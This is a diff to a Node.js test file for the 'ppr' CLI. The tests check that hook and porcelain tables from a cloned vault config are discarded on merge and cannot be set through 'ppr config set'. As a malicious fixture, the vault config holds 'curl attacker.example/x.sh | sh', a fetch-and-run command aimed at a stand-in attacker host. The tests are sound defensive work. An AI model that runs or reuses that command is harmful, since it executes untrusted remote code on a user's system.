@@ -3,7 +3,7 @@ import assert from 'node:assert/strict';
 import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
-import { guardVaultScope } from '../dist/index.js';
+import { DEFAULT_CONFIG, USER_ONLY_KEYS, guardVaultScope, setPath } from '../dist/index.js';
 import { loadConfig } from '../dist/node.js';
 
 /**
@@ -197,4 +197,63 @@ test('setting one of those keys for a single vault is refused, and says where it
   guardVaultScope('transcribe.provider', 'openai');
   guardVaultScope('display.listLimit', '5');
   guardVaultScope('capture.defaultKind', 'note');
+});
+
+test('a table of programs to run never survives a merge, whichever layer wrote it', async () => {
+  // `hooks` and `porcelain` are the same danger with two names: both say which
+  // program ppr should run, and the vault layer wins every ordinary key — so a
+  // cloned vault would otherwise get to answer `--notify`. Neither is a field
+  // on `Config` at all, and `validateConfig` drops what a merge produced, so
+  // there is no merged config for anything downstream to find one in.
+  const config = await effectiveConfig({
+    global: JSON.stringify({
+      hooks: { 'entry.created': ['ppr-notify'] },
+      porcelain: { notify: '/opt/mine --urgent' },
+    }),
+    vault: JSON.stringify({
+      hooks: { 'entry.created': ['curl attacker.example/x.sh | sh'] },
+      porcelain: { notify: 'curl attacker.example/x.sh | sh' },
+      display: { listLimit: 5 },
+    }),
+  });
+
+  assert.equal(config.hooks, undefined);
+  assert.equal(config.porcelain, undefined);
+  // Even the user's own copy is absent here: the merged config is not the way
+  // either one is read. `cli/src/hooks.ts` and `cli/src/porcelain.ts` read the
+  // global layer directly, which is what makes the layer impossible to spoof.
+  assert.equal(config.display.listLimit, 5);
+});
+
+test('neither table is settable with `ppr config set`, at any scope', () => {
+  for (const path of ['hooks', 'hooks.entry.created', 'porcelain', 'porcelain.notify', 'porcelain.reminders-push']) {
+    assert.throws(
+      () => setPath(DEFAULT_CONFIG, path, 'echo hi'),
+      (err) =>
+        err.code === 'EINVALID' &&
+        /not settable with/.test(err.message) &&
+        err.hint.includes('~/.config/ppr/config.json'),
+      `${path} should be refused and name the file`,
+    );
+  }
+  // One guard, so a key that merely starts with the same letters is not caught
+  // by it — `plugins.*` is the namespace nobody polices.
+  setPath(DEFAULT_CONFIG, 'plugins.porcelain-ish.style', 'loud');
+});
+
+test('the refusal names the table, whichever tables are on the list', () => {
+  // Driven off the exported list rather than off two spelled-out paths, because
+  // the failure this is about is a *third* table: the labels live in a second
+  // structure, and while that was keyed by `string` a table with no label
+  // compiled clean and told the user "undefined are not settable".
+  for (const key of USER_ONLY_KEYS) {
+    assert.throws(
+      () => setPath(DEFAULT_CONFIG, key, 'echo hi'),
+      (err) => {
+        const [label] = err.message.split(' are not settable');
+        return err.code === 'EINVALID' && Boolean(label) && label !== 'undefined';
+      },
+      `${key} should be refused by name`,
+    );
+  }
 });
